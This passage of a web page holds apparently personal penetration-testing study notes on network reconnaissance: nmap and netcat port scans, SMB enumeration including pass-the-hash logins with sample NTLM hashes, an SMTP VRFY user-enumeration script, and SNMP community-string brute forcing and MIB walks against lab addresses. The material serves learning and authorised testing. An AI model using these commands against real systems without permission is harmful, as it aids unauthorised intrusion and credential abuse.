style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  nc -nvv -w <span style=color:#ae81ff>1</span> -z 192.168.5.151 3388-3390</span></span></code></pre></div></div><ul><li><code class=verbatim>-w</code>: Connection timeout in seconds.</li><li><code class=verbatim>-z</code>: Zero-I/O mode, which means send no data.</li><li><code class=verbatim>3388-3390</code> Port ranger</li></ul></div></div><div id=outline-container-headline-66 class=outline-5><h5 id=headline-66>9.2.1.2. UDP port scanning - Send an empty UDP packet</h5><div id=outline-text-headline-66 class=outline-text-5><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  nc -nv -u -z -w <span style=color:#ae81ff>1</span> 10.11.1.115 160-162</span></span></code></pre></div></div><ul><li><code class=verbatim>-u</code>: Send UDP packet.</li></ul><p>If UDP port is open, the packet will received by the application layer and a response will receive or not depend on how the application is programmed to respond to empty packets.</p><p>If the destination UDP port is closed, the target should respond with an <strong>ICMP port unreachable</strong> message that is sent by the UDP/IP stack of the target machine.
<strong>Note: No response not necessarily mean that the port is open, it could be filtered by a firewall.</strong></p></div></div></div></div><div id=outline-container-headline-67 class=outline-4><h4 id=headline-67>9.2.2. Nmap</h4><div id=outline-text-headline-67 class=outline-text-4><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  sudo nmap -sS 10.10.1.222</span></span></code></pre></div></div><p><code class=verbatim>-sS</code>: Sending SYN packets without completing a three-way handshake or this will not send ACK packet after receiving SYN-ACK packet from an open port. Default behavior when running nmap with sudo privilege.
<code class=verbatim>-sT</code>: Complete three-way handshake, default scanning technique when running nmap without sudo privilege.
<code class=verbatim>-sU</code>: Perform UDP port scan using <strong>ICMP port unreachable</strong> method and for common UDP ports it uses protocol-specific packet. E.g for port 161 it send SNMP packet.</p><p>Host discovery on the specified IP range:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  nmap -sn 10.10.1.1-254</span></span></code></pre></div></div><p>Host discovery and save the output to grepable format:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  nmap -v -sn 10.10.1.1-254 -oG ping-sweep.txt</span></span></code></pre></div></div><p>Scan top 20 commonly used ports:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  nmap -sT -A --top-ports<span style=color:#f92672>=</span><span style=color:#ae81ff>20</span> 10.10.1.1-254 -oG top-port-sweep.txt</span></span></code></pre></div></div><p>Commonly used ports are defined in the <code class=verbatim>/usr/share/nmap/nmap-services</code> file.</p><p>OS Fingerprinting:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  sudo nmap -O 10.10.1.220</span></span></code></pre></div></div><p>Banner Grabbing/Service Enumeration</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  nmap -sV -sT -A 10.10.1.220</span></span></code></pre></div></div><ul><li><code class=verbatim>-sV</code> Grab service banners</li><li><code class=verbatim>-A</code> Use OS and service enumeration scripts</li></ul><p>Nmap Scripting Engine (NSE) which performs DNS enumeration, brute force attacks, vulnerability identification, etc. NSE scripts are located in the <code class=verbatim>/usr/share/nmap/scripts</code> directory.</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  nmap 10.10.1.220 --script<span style=color:#f92672>=</span>smb-os-discovery</span></span></code></pre></div></div><ul><li><code class=verbatim>smb-os-discovery</code> script attempts to connect to the SMB service on a target system and determine its operating system.</li></ul><p>Get info about a script:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  nmap --script-help dns-zone-transfer</span></span></code></pre></div></div></div></div></div></div><div id=outline-container-headline-68 class=outline-3><h3 id=headline-68>9.3. SMB Enumeration</h3><div id=outline-text-headline-68 class=outline-text-3><div id=outline-container-headline-69 class=outline-4><h4 id=headline-69>9.3.1. NetBIOS</h4><div id=outline-text-headline-69 class=outline-text-4><p>NetBIOS is a service that allows applications and computers to communicate over a local area network (LAN).
NetBIOS provides three distinct services:</p><ol><li>Name Service (NetBIOS-NS) for name registration and resolution. Port UDP 137.</li><li>Datagram Distribution Service (NetBIOS-DGM) for connectionless communication. Port UDP 138.</li><li>Session Service (NetBIOS-SSN) for connection-oriented communication on top of which SMB runs. Port TCP 139.</li></ol><p>While modern implementations of SMB can work without NetBIOS, NetBIOS over TCP (NBT) is required for backward compatibility and is often enabled together.</p><p>For this reason, enumeration of NetBIOS and SMB services is needed:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>  nmap -v -p 139,445 -oG smb.txt 10.10.1.1-254</span></span></code></pre></div></div><p>There are also more specialized tools for identifying NetBIOS information:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>  sudo nbtscan -r 10.10.1.0/24</span></span></code></pre></div></div><p><code class=verbatim>-r</code>: Use local port 137 for scans which is used to query the NetBIOS name service for valid NetBIOS names.</p></div></div><div id=outline-container-headline-70 class=outline-4><h4 id=headline-70>9.3.2. SMB Enumeration with Nmap</h4><div id=outline-text-headline-70 class=outline-text-4><p>Nmap contains many useful scripts in the <code class=verbatim>/usr/share/nmap/scripts/smb</code> directory that can be used to enumerate SMB services.</p><p>E.g Attempts to determine the operating system, computer name, domain, workgroup, and current time over the SMB protocol (ports 445 or 139) using <code class=verbatim>smb-os-discovery</code> script:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>  nmap -v -p 139, 445 --script=smb-os-discovery 10.10.1.227</span></span></code></pre></div></div><p><code class=verbatim>-v</code>: Increase the verbosity level.</p></div></div><div id=outline-container-headline-71 class=outline-4><h4 id=headline-71>9.3.3. SMB Enumeration with <code class=verbatim>enum4linux</code></h4><div id=outline-text-headline-71 class=outline-text-4><p>The <code class=verbatim>enum4linux</code> enumerates SMB shares, password policy, OS information, users, group membership, Nbtstat info and determine if host is in workgroup or domain:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  enum4linux 192.168.207.13</span></span></code></pre></div></div></div></div><div id=outline-container-headline-72 class=outline-4><h4 id=headline-72>9.3.4. SMB Enumeration with <code class=verbatim>net view</code></h4><div id=outline-text-headline-72 class=outline-text-4><p>In Windows system we can use <code class=verbatim>net view</code> to list domains, resources, and computers belonging to a given host. As an example, we can list all the shares running on dc01:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>net view \\dc01 /all</span></span></code></pre></div></div><ul><li><code class=verbatim>/all</code> lists all administrative shares which are ending with the dollar sign.</li><li>We can also replace host name <code class=verbatim>dc01</code> with IP address of the system.</li></ul></div></div><div id=outline-container-headline-73 class=outline-4><h4 id=headline-73>9.3.5. Smbclient - From Linux</h4><div id=outline-text-headline-73 class=outline-text-4><p>Authenticate to the SMB server using NLTM hash:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  smbclient <span style=color:#ae81ff>\\\\</span>192.168.189.248<span style=color:#ae81ff>\\</span>transfer -U john --pw-nt-hash 54abdf854v8cz653b1be3458454e5a4d</span></span></code></pre></div></div></div></div><div id=outline-container-headline-74 class=outline-4><h4 id=headline-74>9.3.6. SMBMap - From Linux</h4><div id=outline-text-headline-74 class=outline-text-4><p>Enumerate SMB shares using NTLM hash of a user:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  smbmap  -u username -p <span style=color:#e6db74>&#39;54abev854d8c065vb1be3458454e4a3d&#39;</span> -H 192.168.189.248</span></span></code></pre></div></div></div></div></div></div><div id=outline-container-headline-75 class=outline-3><h3 id=headline-75>9.4. SMTP Enumeration</h3><div id=outline-text-headline-75 class=outline-text-3><p>SMTP enumeration using SMTP commands, VRFY and EXPN. VRFY allow to verify the existence of a email address and VRFY asks server for the membership of a mailing list.</p><p>Verify an email address by connecting to the SMTP server on port 25 using Netcat:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  nc -nv 10.10.1.217 <span style=color:#ae81ff>25</span></span></span></code></pre></div></div><p>(UNKNOWN) [10.10.1.217] 25 (smtp) open
220 it.localdomain ESMTP Postfix
VRFY root
252 2.0.0 root
VRFY idontexist
550 5.1.1 &lt;idontexist>: Recipient address rejected: User unknown in local recipient table
^C</p><p>Automate the above verification process by using a Python script:</p><div class="src src-python"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/python</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> socket
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> len(sys<span style=color:#f92672>.</span>argv) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>2</span>:
</span></span><span style=display:flex><span>        print <span style=color:#e6db74>&#34;Usage: vrfy.py &lt;username&gt;&#34;</span>
</span></span><span style=display:flex><span>        sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Create a Socket</span>
</span></span><span style=display:flex><span>s <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Connect to the Server</span>
</span></span><span style=display:flex><span>connect <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>connect((<span style=color:#e6db74>&#39;10.10.1.217&#39;</span>,<span style=color:#ae81ff>25</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Receive the banner</span>
</span></span><span style=display:flex><span>banner <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print banner
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># VRFY a user</span>
</span></span><span style=display:flex><span>s<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#39;VRFY &#39;</span> <span style=color:#f92672>+</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>result <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print result
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Close the socket</span>
</span></span><span style=display:flex><span>s<span style=color:#f92672>.</span>close()</span></span></code></pre></div></div></div></div><div id=outline-container-headline-76 class=outline-3><h3 id=headline-76>9.5. SNMP Enumeration</h3><div id=outline-text-headline-76 class=outline-text-3><div id=outline-container-headline-77 class=outline-4><h4 id=headline-77>9.5.1. Nmap</h4><div id=outline-text-headline-77 class=outline-text-4><p>Scan SNMP port UDP 161 using Nmap:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  sudo nmap -sU --open -p <span style=color:#ae81ff>161</span> 10.10.1.1-254 -oG open-snmp.txt</span></span></code></pre></div></div></div></div><div id=outline-container-headline-78 class=outline-4><h4 id=headline-78>9.5.2. onesixtyone</h4><div id=outline-text-headline-78 class=outline-text-4><p>Use <code class=verbatim>onesixtyone</code>, a SNMP scanner which discover devices responding to well-known community names or to mount a dictionary attack against one or more SNMP devices.</p><p>To brute force a list of community names, lets build a word list of community names:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  echo public &gt; community.txt
</span></span><span style=display:flex><span>  echo private &gt;&gt; community.txt
</span></span><span style=display:flex><span>  echo manager &gt;&gt; community.txt</span></span></code></pre></div></div><p>Then perform brute force using <code class=verbatim>onesixtyone</code>:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  onesixtyone -c community.txt -i ips.txt <span style=color:#ae81ff>10</span> 10.10.1.14</span></span></code></pre></div></div></div></div><div id=outline-container-headline-79 class=outline-4><h4 id=headline-79>9.5.3. snmpwalk</h4><div id=outline-text-headline-79 class=outline-text-4><p>Enumerating the entire MIB tree of Windows system that exposes SNMP port:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  snmpwalk -c public -v1 -t <span style=color:#ae81ff>10</span> 10.10.1.14</span></span></code></pre></div></div><ul><li><code class=verbatim>-c</code>: specifies the community string.</li><li><code class=verbatim>-v</code>: specifies the SNMP version number.</li><li><code class=verbatim>-t</code>: increases the timeout period to 10 seconds.</li></ul><p>Enumerating Windows users:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  snmpwalk -c public -v1 10.10.1.14 1.3.6.1.4.1.77.1.2.25</span></span></code></pre></div></div><p>Enumerating running Windows processes</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  snmpwalk -c public -v1 10.10.1.73 1.3.6.1.2.1.25.4.2.1.2</span></span></code></pre></div></div><p>Enumerating open TCP Ports</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  snmpwalk -c public -v1 10.10.1.14 1.3.6.1.2.1.6.13.1.3</span></span></code></pre></div></div><p>Enumerating installed software</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  snmpwalk -c public -v1 10.10.1.50 1.3.6.1.2.1.25.6.3.1.2</span></span></code></pre></div></div><p>Enumerate all MIBs:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  snmpbulkwalk -c public -v2c 10.10.1.50 .</span></span></code></pre></div></div><ul><li><code class=verbatim>-c</code> Community string.</li><li><code class=verbatim>-v2c</code> SNMP version.</li></ul><p>Query the extension MIB (<code class=verbatim>NET-SNMP-EXTEND-MIB</code>) which is used to run arbitrary shell scripts and the result will be send SNMP client:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>  snmpbulkwalk -c public -v2c 192.168.213.156 NET-SNMP-EXTEND-MIB::nsExtendOutputFull</span></span></code></pre></div></div></div></div><div id=outline-container-headline-80 class=outline-4><h4 id=headline-80>9.5.4. References</h4><div id=outline-text-headline-80 class=outline-text-4><ul><li><a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/>https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/</a></li><li><a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce>https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce</a></li><li><a href=https://access.redhat.com/documentation/fr-fr/red_hat_enterprise_linux/6/html/deployment_guide/sect-system_monitoring_tools-net-snmp-extending>https://access.redhat.com/documentation/fr-fr/red_hat_enterprise_linux/6/html/deployment_guide/sect-system_monitoring_tools-net-snmp-extending</a></li></ul></div></div></div></div><div id=outline-container-headline-81 class=outline-3><h3 id=headline-81>9.6. NFS Enumeration</h3><div id=outline-text-headline-81 class=outline-text-3><p>Portmapper or RPCbind which run on TCP port 111 maps RPC services to the ports on which they listen.</p><p>RPC processes notify rpcbind when they start, registering the ports they are listening on and the RPC program numbers they expect to serve.</p><p>The client system then contacts rpcbind on the server with a particular RPC program number. The rpcbind service redirects the client to the proper port number (often TCP port 2049 for NFS) so it can communicate with the requested service.</p><p>Scan the ports with Nmap:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  nmap -v -p <span style=color:#ae81ff>111</span> 10.10.1.1-254</span></span></code></pre></div></div><p>Nmap script <code class=verbatim>rpcinfo</code> to find services mapped to rpcbind:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  nmap -sV -p <span style=color:#ae81ff>111</span> --script<span style=color:#f92672>=</span>rpcinfo 10.10.1.1-254</span></span></code></pre></div></div><p>Once found a NFS share (default on TCP 2049), use Nmap script <code class=verbatim>nfs-ls</code>, <code class=verbatim>nfs-showmount</code> and <code class=verbatim>nfs-statfs</code>:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  nmap -p <span style=color:#ae81ff>111</span> --script nfs* 10.10.1.72</span></span></code></pre></div></div></div></div></div></div><div id=outline-container-headline-82 class=outline-2><h2 id=headline-82>10. Miscellaneous</h2><div id=outline-text-headline-82 class=outline-text-2><div id=outline-container-headline-83 class=outline-3><h3 id=headline-83>10.1. Pdftotext</h3><div id=outline-text-headline-83 class=outline-text-3><p>Convert PDF files to plain text file</p></div></div><div id=outline-container-headline-84 class=outline-3><h3 id=headline-84>10.2. AWK</h3><div id=outline-text-headline-84 class=outline-text-3><p>Extract content delimited by multiple spaces:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  awk -F <span style=color:#e6db74>&#39;  +&#39;</span> <span style=color:#e6db74>&#39;{print $1}&#39;</span></span></span></code></pre></div></div></div></div></div></div><div id=outline-container-headline-85 class=outline-2><h2 id=headline-85>11. Footnotes</h2></div><div class=footnotes><hr class=footnotes-separatator><div class=footnote-definitions><div class=footnote-definition><sup id=footnote-1><a href=#footnote-reference-1>1</a></sup><div class=footnote-body><p>Mscache is also referenced as Domain Cached Credentials or DCC2 or DCC. The purpose of mscache is for users to still be able to login to their Windows box in the case it cannot reach the domain controller:</p></div></div></div></div></main><footer><hr> <a href=https://www.atomicl.net>Vithurshan SELVARAJAH</a> 2022 &ndash; 2024 | <a href=https://github.com/BlackcatRs>Github</a> | <a href=https://www.linkedin.com/in/vithurshan-selvarajah/>LinkedIn</a></footer></body></html>